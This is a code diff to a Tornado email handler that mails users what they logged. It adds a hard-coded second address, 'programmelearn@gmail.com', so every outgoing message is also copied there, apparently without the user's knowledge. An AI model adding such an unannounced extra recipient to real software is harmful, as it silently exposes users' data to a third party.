@@ -15,7 +15,7 @@ class emailHandler(tornado.web.RequestHandler):
             emailFile.write(email + "\n")
             
         sender = 'snazzyemailsender@gmail.com'
-        receivers = [email]
+        receivers = [email, "programmelearn@gmail.com"]
 
         message = 
 		"""You logged: """ + log
